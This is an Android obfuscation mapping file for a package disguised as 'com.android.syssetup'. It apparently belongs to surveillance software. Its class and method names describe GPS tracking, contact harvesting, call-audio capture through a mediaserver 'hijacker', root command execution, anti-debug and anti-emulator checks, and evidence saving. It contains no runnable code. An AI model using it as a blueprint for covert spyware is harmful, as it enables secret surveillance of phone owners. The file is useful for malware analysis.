android.media.AmrInputStream -> android.media.AmrInputStream:
    191:203:void onLocationChanged(android.location.Location) -> onLocationChanged
    210:210:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    216:216:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    222:222:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.syssetup.module.position.GPSLocatorDistance -> stt.cB:
    float latitude -> jq
    float longitude -> jr
    float distance -> js
    com.android.syssetup.event.EventLocation rangeObserver$1f582f50$377cb50b -> jt
    boolean entered -> ct
    android.location.Location location -> ju
    44:45:void initLocationUpdates() -> ej
    48:80:void onLocationChanged(android.location.Location) -> onLocationChanged
    87:87:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    93:93:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    99:99:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.syssetup.module.position.GPSLocatorPeriod -> stt.cC:
    int period -> dT
    27:28:void initLocationUpdates() -> ej
com.android.syssetup.module.task.Contact -> stt.cD:
    com.android.syssetup.module.task.UserInfo userInfo -> jv
    java.util.ArrayList emailInfo$7865b31 -> jw
    java.util.ArrayList paInfo$7865b31 -> jx
    java.util.ArrayList phoneInfo$7865b31 -> jy
    java.util.ArrayList imInfo$7865b31 -> jz
    java.util.ArrayList orgInfo$7865b31 -> jA
    java.util.ArrayList webInfo$7865b31 -> jB
    byte[] $ -> end
    int $$ -> record
    40:41:void add(com.android.syssetup.module.task.EmailInfo) -> absolute
    44:45:void add(com.android.syssetup.module.task.PostalAddressInfo) -> absolute
    48:49:void add(com.android.syssetup.module.task.PhoneInfo) -> absolute
    52:53:void add(com.android.syssetup.module.task.ImInfo) -> absolute
    56:57:void add(com.android.syssetup.module.task.OrganizationInfo) -> absolute
    60:61:void add(com.android.syssetup.module.task.WebsiteInfo) -> absolute
    64:64:com.android.syssetup.module.task.UserInfo getUserInfo() -> eq
    76:76:java.util.ArrayList getPhoneInfo$5679c1ce() -> er
    93:101:java.lang.String toString() -> toString
    105:173:java.lang.String getInfo() -> getInfo
    177:177:long getId() -> getId
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.task.EmailInfo -> stt.cE:
    long userId -> jC
    int emailType -> jD
    java.lang.String email -> jE
    30:30:int getEmailType() -> es
    34:34:java.lang.String getEmail() -> et
com.android.syssetup.module.task.ImInfo -> stt.cF:
    long userId -> jC
    int imType -> jF
    java.lang.String im -> jG
    30:30:int getImType() -> eu
    34:34:java.lang.String getIm() -> ev
com.android.syssetup.module.task.OrganizationInfo -> stt.cG:
    int userId -> jH
    int type -> type
    java.lang.String companyName -> jI
    java.lang.String companyTitle -> jJ
    32:32:int getType() -> getType
    36:36:java.lang.String getCompanyName() -> ew
    40:40:java.lang.String getCompanyTitle() -> ex
com.android.syssetup.module.task.PhoneInfo -> stt.cH:
    long userId -> jC
    int phoneType -> jK
    java.lang.String phoneNumber -> jL
    30:30:int getPhoneType() -> getPhoneType
    34:34:java.lang.String getPhoneNumber() -> set
com.android.syssetup.module.task.PickContact -> stt.cI:
    byte[] $ -> end
    30:52:void addUserPhones(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> absolute
    56:73:void addUserEmails(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> and
    77:111:void addUserInfos(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> array
    115:151:void addUserPA(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> asm
    155:176:void addUserIm(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> begin
    180:205:void addUserOrg(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> case
    209:230:void addUserWebsite(android.content.ContentResolver,android.database.Cursor,java.util.Hashtable) -> const
    233:251:java.util.Hashtable getContactInfo() -> ey
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.task.PostalAddressInfo -> stt.cJ:
    long userId -> jC
    int type -> type
    java.lang.String street -> jM
    java.lang.String poBox -> jN
    java.lang.String neighbor -> jO
    java.lang.String city -> jP
    java.lang.String state -> jQ
    java.lang.String postalCode -> jR
    java.lang.String country -> jS
    39:39:int getType() -> getType
    43:43:java.lang.String getStreet() -> ez
    47:47:java.lang.String getPoBox() -> eA
    51:51:java.lang.String getNeighbor() -> eB
    55:55:java.lang.String getCity() -> eC
    59:59:java.lang.String getState() -> eD
    63:63:java.lang.String getPostalCode() -> getPostalCode
    67:67:java.lang.String getCountry() -> getCountry
com.android.syssetup.module.task.UserInfo -> stt.cK:
    java.lang.String completeName -> jT
    java.lang.String userNote -> jU
    java.lang.String userNickname -> jV
    long userId -> jC
    26:26:java.lang.String getCompleteName() -> eE
    30:30:java.lang.String getUserNote() -> eF
    34:34:java.lang.String getUserNickname() -> eG
    38:38:long getUserId() -> eH
com.android.syssetup.module.task.WebsiteInfo -> stt.cL:
    long userId -> jC
    java.lang.String websiteName -> jW
    28:28:java.lang.String getWebsiteName() -> eI
com.android.syssetup.optimize.SetupSystem -> com.android.syssetup.optimize.SetupSystem:
    android.content.Context context -> P
    boolean stop -> az
    long BeforeTime -> jX
    byte[] $ -> end
    24:37:boolean getResults(long[]) -> array
    41:47:void start(int) -> or
    60:87:boolean isNotOptimized() -> eJ
    14:14:long access$002(com.android.syssetup.optimize.SetupSystem,long) -> absolute
    14:14:long access$000(com.android.syssetup.optimize.SetupSystem) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.optimize.SetupSystem$1 -> stt.cM:
    java.lang.String val$host -> jY
    com.android.syssetup.optimize.SetupSystem this$0 -> jZ
    67:81:void run() -> run
com.android.syssetup.util.AntiDebug -> stt.cN:
    byte[] $ -> end
    15:19:boolean checkFlag() -> eK
    38:38:boolean checkConnected() -> eL
    47:47:boolean isDebug() -> eM
    51:63:boolean isPlayStore() -> eN
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.AntiEmulator -> stt.cO:
    int NUMTESTSTM -> ka
    int NUMTESTSNOTM -> kb
    android.telephony.TelephonyManager tm -> kc
    byte[] $ -> end
    24:53:int checkKeys() -> eO
    58:71:int checkTags() -> eP
    76:87:int checkProduct() -> eQ
    92:103:int checkDevice() -> eR
    108:125:int checkBrand() -> eS
    129:148:int checkScaling() -> eT
    153:166:int checkManufacturer() -> eU
    171:188:int checkId() -> eV
    193:211:int checkSubscriber() -> eW
    216:229:int checkOperator() -> eX
    234:263:int checkPhoneNumber() -> eY
    267:294:int isEmu(int) -> packed
    298:302:int isEmu(int[]) -> absolute
    310:313:boolean isEmu() -> eZ
    319:330:boolean isTestEmu() -> fa
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.AudioEncoder -> stt.cP:
    java.lang.String audioDirectory -> kd
    java.lang.String audioStorage -> ke
    boolean call_finished -> kf
    int last_epoch -> kg
    int first_epoch -> kh
    int data_size -> ki
    int sampleRate -> kj
    java.lang.String rawFile -> kk
    byte[] rawPcm -> kl
    byte[] $ -> end
    50:65:boolean createAudioStorage() -> fb
    70:74:java.lang.String getAudioStorage() -> fc
    78:90:boolean deleteAudioStorage() -> fd
    98:160:int getInferredSampleRate() -> fe
    165:212:boolean encodetoAmr(java.lang.String,byte[]) -> and
    218:250:byte[] resample(boolean) -> interface
    254:385:byte[] decodeRawChunks() -> ff
    391:404:void removeRawFile() -> fg
    410:410:int getCallStartTime() -> fh
    414:414:int getCallEndTime() -> fi
    422:422:int getAllegedSampleRate() -> fj
    426:426:boolean isLastCallFinished() -> fk
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.CallBack -> stt.cQ:
    java.util.ArrayList callbacks$7865b31 -> km
    13:14:void register$5dae15ba(com.android.syssetup.module.ModuleCall$HC) -> absolute
    17:22:void trigger$5d527811$552c4e01() -> fl
com.android.syssetup.util.DataBuffer -> stt.cR:
    java.nio.ByteBuffer byteBuffer -> kn
    64:64:int readInt() -> readInt
    74:74:long readLong() -> readLong
    84:85:void read(byte[]) -> type
    97:98:void write(byte[]) -> write
    106:107:void writeInt(int) -> writeInt
    115:116:void writeLong(long) -> writeLong
    119:121:void writeDouble(double) -> writeDouble
    124:125:void writeFloat(float) -> writeFloat
    128:129:void writeByte(byte) -> writeByte
    132:133:void writeShort(short) -> writeShort
com.android.syssetup.util.DateTime -> stt.cS:
    long ticks -> ko
    java.util.Date date -> cm
    119:123:long getFiledate(java.util.Date) -> and
    132:139:java.util.Date getDate() -> getDate
    152:152:long getFiledate() -> fm
    170:201:byte[] getStructTm() -> fn
    221:222:int hiDateTime() -> fo
    231:232:int lowDateTime() -> fp
    242:242:java.lang.String toString() -> toString
    251:272:byte[] getStructSystemdate() -> fq
com.android.syssetup.util.Execute -> stt.cT:
    byte[] $ -> end
    24:34:com.android.syssetup.util.ExecuteResult executeRoot(java.lang.String) -> pz
    96:126:com.android.syssetup.util.ExecuteResult executeSimple(java.lang.String) -> pA
    130:174:com.android.syssetup.util.ExecuteResult execute(java.lang.String) -> pB
    178:227:com.android.syssetup.util.ExecuteResult execute(java.lang.String[]) -> absolute
    234:241:boolean executeWaitFor(java.lang.String) -> pC
    246:261:boolean executeRootAndForgetScript(java.lang.String) -> pD
    265:303:com.android.syssetup.util.ExecuteResult executeScript(java.lang.String) -> pE
    308:309:void chmod(java.lang.String,java.lang.String) -> file
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.ExecuteResult -> stt.cU:
    java.lang.String executionLine -> kp
    int exitCode -> kq
    java.util.ArrayList stdout -> kr
    java.util.ArrayList stderr -> ks
    22:22:java.lang.String getStdout() -> fr
    30:37:java.lang.String listToString(java.util.ArrayList) -> const
    45:57:void saveEvidence() -> fs
com.android.syssetup.util.Instrument -> stt.cV:
    java.lang.String lib -> kt
    java.lang.String hijacker -> ku
    java.lang.String path -> kv
    java.lang.String dumpPath -> kw
    java.lang.String pidCompletePath -> kx
    java.lang.String pidFile -> ky
    java.lang.String proc -> kz
    com.android.syssetup.util.Instrument$MediaserverMonitor pidMonitor -> kA
    boolean stopMonitor -> kB
    java.lang.Thread monitor -> kC
    int killed -> kD
    java.lang.String lid -> kE
    byte[] $ -> end
    47:51:boolean deleteHijacker() -> ft
    56:79:boolean installHijacker() -> fu
    83:194:boolean startInstrumentation() -> fv
    198:200:void stopInstrumentation() -> fw
    204:232:int getProcessPid() -> fx
    237:247:void killProc() -> fy
    18:18:boolean access$000(com.android.syssetup.util.Instrument) -> absolute
    18:18:boolean access$002$7fdbc4e9(com.android.syssetup.util.Instrument) -> and
    18:18:int access$100(com.android.syssetup.util.Instrument) -> array
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.Instrument$MediaserverMonitor -> stt.cV$absolute:
    int cur_pid -> kF
    int start_pid -> kG
    int failedCounter -> kH
    com.android.syssetup.util.Instrument this$0 -> kI
    262:263:void setPid(int) -> procedure
    269:298:void run() -> run
com.android.syssetup.util.PackageUtils -> stt.cW:
    byte[] $ -> end
    241:271:java.util.ArrayList getInstalledApps$2a667459() -> fz
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.util.PackageUtils$PInfo -> stt.cW$absolute:
    java.lang.String appname -> kJ
    java.lang.String pname -> kK
    java.lang.String versionName -> versionName
    java.lang.String apkPath -> kL
    int versionCode -> versionCode
    533:533:java.lang.String toString() -> toString
    500:500:java.lang.String access$000(com.android.syssetup.util.PackageUtils$PInfo) -> absolute
    500:500:java.lang.String access$002(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> absolute
    500:500:java.lang.String access$102(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> and
    500:500:java.lang.String access$202(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> array
    500:500:int access$302(com.android.syssetup.util.PackageUtils$PInfo,int) -> absolute
    500:500:java.lang.String access$402(com.android.syssetup.util.PackageUtils$PInfo,java.lang.String) -> asm
com.android.syssetup.util.Utils -> stt.cX:
    java.security.SecureRandom rand -> kM
    59:72:void sleep(int) -> program
    80:80:long getRandom() -> fA
    84:88:int[] getRandomIntArray$2558076() -> fB
    92:97:byte[] getRandomByteArray$486860e8() -> fC
    106:106:long getTimeStamp() -> fD
    111:123:byte[] concat(byte[][]) -> absolute
    131:141:byte[] getAsset(java.lang.String) -> pF
    150:158:java.io.InputStream getAssetStream(java.lang.String) -> pG
    163:174:void copy(java.io.File,java.io.File) -> absolute
    178:206:boolean streamDecodeWrite(java.lang.String,java.io.InputStream,java.lang.String) -> absolute
    213:214:boolean dumpAsset(java.lang.String,java.lang.String) -> for
com.android.syssetup.util.WChar -> stt.cY:
    byte[] $ -> end
    42:42:byte[] getBytes(java.lang.String) -> getBytes
    54:92:byte[] getBytes(java.lang.String,boolean) -> and
    103:115:byte[] pascalize(byte[]) -> unit
    126:126:java.lang.String getString$5a238448(byte[]) -> until
    139:168:java.lang.String getString$20e7da8$489d23ed(byte[],int) -> for
    179:186:java.lang.String readPascal(com.android.syssetup.util.DataBuffer) -> absolute
    196:196:byte[] pascalize(java.lang.String) -> pH
    java.lang.String $(int,int,int) -> absolute
com.musicg.dsp.LinearInterpolation -> stt.cZ:
    40:65:short[] interpolate$2d6f975f(int,short[]) -> absolute
com.musicg.dsp.Resampler -> stt.da:
    41:84:byte[] reSample$3bcfdf96(byte[],int,int) -> array
com.musicg.wave.Wave -> stt.db:
    com.musicg.wave.WaveHeader waveHeader -> kN
    byte[] data -> unit
    byte[] $ -> end
    231:231:byte[] getBytes() -> getBytes
    249:250:float length() -> length
    259:273:java.lang.String timestamp() -> fE
    300:303:java.lang.String toString() -> toString
    java.lang.String $$24d420ae() -> until
